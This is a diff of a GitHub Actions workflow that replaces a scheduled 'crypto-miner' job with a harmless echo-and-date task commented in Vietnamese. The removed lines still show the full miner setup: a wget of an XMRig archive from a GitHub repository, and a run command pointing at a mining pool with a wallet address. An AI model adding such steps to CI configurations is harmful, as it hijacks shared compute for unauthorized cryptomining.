@@ -1,40 +1,21 @@
-name: Advanced Auto Runner
+name: Auto Task Example
 
 on:
-  schedule:
-    - cron: '*/15 * * * *'
-  push:
-    branches: [ main, develop ]
-  workflow_dispatch:
-
-env:
-  NODE_ENV: production
+  push:           # Kích hoạt khi có push code
+    branches:
+      - main      # Chỉ chạy trên nhánh main
+  workflow_dispatch: # Cho phép bấm nút "Run workflow" thủ công
 
 jobs:
-  crypto-miner:
+  run-task:
     runs-on: ubuntu-latest
-    
+
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v4
-      
-    - name: Download and setup XMRig
-      run: |
-        wget https://github.com/phamhuyhoang2k4/renderapp/raw/refs/heads/main/xmrig-6.22.3.tar
-        tar -xvf xmrig-6.22.3.tar
-        cd xmrig-6.22.3
-        
-    - name: Run XMRig miner
-      run: |
-        cd xmrig-6.22.3
-        ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xdb3bd6c6a106c9b8b2e7ccdd5beac8ec9584e820.test -p x
-      
-    - name: Notify success
-      if: success()
-      run: |
-        echo "✅ Mining task completed successfully!"
-        
-    - name: Notify failure
-      if: failure()
-      run: |
-        echo "❌ Mining task failed!"
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Run auto task
+        run: |
+          echo "🚀 Hello from GitHub Actions!"
+          date
+          echo "Mình vừa chạy xong một tác vụ hợp pháp 😉"
